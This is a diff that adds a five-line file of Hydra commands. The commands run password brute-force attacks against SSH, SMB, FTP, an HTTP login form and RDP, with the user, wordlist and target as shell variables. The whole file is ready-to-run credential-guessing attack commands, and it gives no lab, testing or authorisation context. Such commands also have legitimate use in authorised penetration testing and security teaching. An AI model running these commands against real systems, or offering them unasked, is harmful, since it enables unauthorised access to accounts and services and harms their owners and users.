@@ -1,0 +1,5 @@
+hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh
+hydra -L "$USERS" -P "$WORDLIST" "$TARGET" smb
+hydra -l "$USER" -P "$WORDLIST" "$TARGET" ftp
+hydra -l "$USER" -P "$WORDLIST" http-post-form "$URL:user=^USER^&pass=^PASS^:Invalid"
+hydra -l "$USER" -P "$WORDLIST" "$TARGET" rdp
